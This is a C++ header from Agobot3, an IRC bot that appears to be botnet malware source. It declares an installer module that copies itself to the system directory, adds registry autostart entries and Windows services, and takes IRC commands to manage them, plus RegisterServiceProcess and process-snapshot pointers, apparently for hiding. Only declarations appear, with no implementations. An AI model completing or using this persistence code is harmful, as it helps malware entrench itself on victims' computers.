/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __INSTALLER_H__
#define __INSTALLER_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"

#ifdef WIN32
// kernel32.dll typedefs/structs
/*
typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32, *LPPROCESSENTRY32;
*/

typedef int (__stdcall *RSP)(DWORD, DWORD);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);

extern RSP fRegisterServiceProcess;
extern CT32S fCreateToolhelp32Snapshot;
extern P32F fProcess32First;
extern P32N fProcess32Next;

extern HANDLE psnap;
extern PROCESSENTRY32 pe32;
#endif

class CInstaller : public CCommandHandler
{
public:
	void Init();
	bool CopyToSysDir(CString &sFilename);
	bool Install();
	bool Uninstall();
#ifdef WIN32
	bool RegStartAdd(CString &sValuename, CString &sFilename);
	bool RegStartDel(CString &sValuename);

	bool ServiceAdd(CString &sServicename, CString &sFilename);
	bool ServiceAddInt(CString &sServicename, CString &sFilename, CString &sParams);

	bool IsInstalled(CString &sServicename);
	bool ServiceStart(CString &sServicename);
#endif // WIN32
	CString m_sSysDir;

	bool HandleCommand(CMessage *pMsg);

#ifdef WIN32
	command	m_cmdAsAdd, m_cmdAsDel,
			m_cmdSvcAdd, m_cmdSvcDel, m_cmdFileDel;
#endif // WIN32
};

#endif // __INSTALLER_H__
